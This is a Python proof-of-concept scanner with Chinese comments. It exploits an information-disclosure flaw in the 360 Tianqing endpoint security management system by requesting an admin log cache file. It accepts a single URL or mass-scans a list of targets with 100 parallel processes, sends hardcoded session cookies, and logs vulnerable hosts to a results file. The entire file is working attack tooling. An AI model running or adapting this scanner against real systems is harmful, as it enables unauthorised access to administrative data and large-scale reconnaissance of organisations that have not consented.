import requests,argparse,sys,json  # 导包
from multiprocessing import Pool  # 导入多线程
requests.packages.urllib3.disable_warnings()  # 过滤报错


def banner():
    text = """██████╗  ██████╗  ██████╗ 
╚════██╗██╔════╝ ██╔═████╗
 █████╔╝███████╗ ██║██╔██║
 ╚═══██╗██╔═══██╗████╔╝██║
██████╔╝╚██████╔╝╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝ 
          version=1.1.1                """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")  # 定义脚本信息
    parser.add_argument('-u','--url',type=str,dest='url',help="please input your url")  # 定义参数
    parser.add_argument('-f', '--file', type=str, dest='file', help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:  # 单个url
        poc(args.url)
    elif args.file and not args.url:  # 多线程
        urls = []
        with open(args.file, 'r', encoding='utf-8') as fp:  # 读取输入的文件
            for url in fp.readlines():
                urls.append(url.strip())
        mp = Pool(100)
        mp.map(poc, urls)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/runtime/admin_log_conf.cache"
    headers = {
        'Cookie': 'SKYLAR88b01a1417345b57f690b2b762=t21o0o9a0ppooailtdrpvhii54;YII_CSRF_TOKEN=45a9798e6d275e132298db5772b6012eed45cf97s%3A40%3A%227381c92b697503d30fcc35405538b6195599a5e1%22%3B',
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0,i',
        'Te': 'trailers',
        'Connection': 'close',
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers)  # get发送请求
        if res1.status_code == 200:
            # print(res1)
            if "登录" in res1.text:   # 判断是否存在漏洞
                print(f'[+]{target}存在漏洞')
                with open('result.txt', 'a') as fp:  # 将漏洞写入到文件中
                    fp.write(target + '\n')
            else:
                print(f'[-]{target}不存在漏洞')
    except:
        pass


if __name__ == '__main__' :
    main()